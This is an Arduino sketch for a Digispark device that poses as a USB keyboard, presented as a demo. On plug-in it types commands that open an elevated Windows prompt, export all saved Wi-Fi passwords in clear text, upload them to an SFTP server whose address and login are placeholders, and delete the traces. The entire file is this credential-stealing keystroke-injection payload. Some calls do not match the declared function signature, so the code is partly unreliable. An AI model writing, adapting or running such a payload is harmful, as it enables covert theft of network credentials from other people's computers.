// DigiDuck code courtesy of uslurper. https://github.com/uslurper
// This program currently does not allow the BREAK key, since I couldn't find it in the USB HID spec.

#include "DigiKeyboard.h"

#define KEY_TAB 43
#define KEY_DOWN 81
#define KEY_DELETE 42
#define KEY_PRINTSCREEN 70
#define KEY_SCROLLLOCK 71
#define KEY_INSERT 73
#define KEY_PAUSE 72
#define KEY_HOME 74
#define KEY_PAGEUP 75
#define KEY_END 77
#define KEY_PAGEDOWN 78
#define KEY_RIGHTARROW 79
#define KEY_RIGHT 79
#define KEY_DOWNARROW 81
#define KEY_LEFTARROW 80
#define KEY_UP 82
#define KEY_UPARROW 82
#define KEY_NUMLOCK 83
#define KEY_CAPSLOCK 57
#define KEY_MENU 118

void digidelay(int n) {

	DigiKeyboard.delay(n);
	DigiKeyboard.sendKeyStroke(0);

}

void digikeypress(String s) {

	DigiKeyboard.sendKeyStroke(s);
	digidelay(0);

}

void digiprint(String s) {

	DigiKeyboard.println(s);
	digidelay(0);

}

void setup() {

	// This code originally written by lucagrosshennig, targeting Windows 10 machines. Used here simply as a demo.
	digidelay(500);
	digikeypress(KEY_R, MOD_GUI_LEFT);
	digidelay(300);
	digiprint("cmd");
	digidelay(300);
	digikeypress(KEY_ENTER, MOD_CTRL_LEFT | MOD_SHIFT_LEFT);
	digidelay(300);
	digikeypress(KEY_LEFTARROW);
	digidelay(100);
	digikeypress(KEY_ENTER);
	digidelay(300);
	digiprint("cd C:\\");
	digikeypress(KEY_ENTER);
	digidelay(100);
	digiprint("md l");
	digikeypress(KEY_ENTER);
	digidelay(100);
	digiprint("cd l && @netsh wlan export profile key=clear >nul");
	digikeypress(KEY_ENTER);
	digidelay(1000);
	digiprint("sftp -oPort=22 **SFTPusername**@**SFTPserver**");
	digikeypress(KEY_ENTER);
	digidelay(1200);
	digiprint("**SFTPpassword**");
	digidelay(70);
	digikeypress(KEY_ENTER);
	digidelay(500);
	digiprint("cd wlan");
	digikeypress(KEY_ENTER);
	digidelay(50);
	digiprint("mput C:\\l\\*.xml");
	digikeypress(KEY_ENTER);
	digidelay(3000);
	digiprint("bye");
	digikeypress(KEY_ENTER);
	digidelay(200);
	digiprint("cd ..");
	digikeypress(KEY_ENTER);
	digidelay(50);
	digiprint("del \"C:\\l\"");
	digikeypress(KEY_ENTER);
	digidelay(50);
	digikeypress(J);
	digikeypress(KEY_ENTER);
	digiprint("exit");
	digikeypress(KEY_ENTER);

}

void loop() {


}